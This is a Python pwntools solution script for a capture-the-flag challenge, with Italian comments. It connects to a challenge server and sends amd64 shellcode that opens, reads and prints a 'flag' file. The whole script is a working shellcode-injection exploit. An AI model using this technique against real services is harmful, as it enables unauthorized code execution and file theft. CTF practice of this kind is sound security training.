#!/usr/bin/env python3
from pwn import *
import re

# connetti
p = remote("software-20.challs.olicyber.it", 13003)

# leggi banner
for _ in range(6):
    print(p.recvline().decode(errors='ignore').rstrip())
print(p.recv(49).decode(errors='ignore').rstrip())
p.sendline(b'1')

# crea shellcode per leggere la flag
# 1) open("flag", O_RDONLY)
# 2) read(fd, buf, 100)
# 3) write(1, buf, n)
shellcode = asm(
    shellcraft.amd64.linux.open('flag', 0) +  # O_RDONLY = 0
    shellcraft.amd64.linux.read('rax', 'rsp', 100) +  # fd in rax, buffer = rsp
    shellcraft.amd64.linux.write(1, 'rsp', 'rax'),    # scrivi su stdout
    arch='x86_64'
)

# ricevi richiesta dimensione shellcode
prompt = p.recvuntil(b": ")
print(prompt.decode().strip())

shell_size = len(shellcode)
print(shell_size)
p.sendline(str(shell_size).encode())

# ricevi richiesta invio esatto di N bytes
line = p.recvuntil(b": ")
print(line.decode().strip())

# invia shellcode
print(shellcode)
p.send(shellcode)

p.recvline()
flag = p.recvline().decode()
print(flag)

p.close()

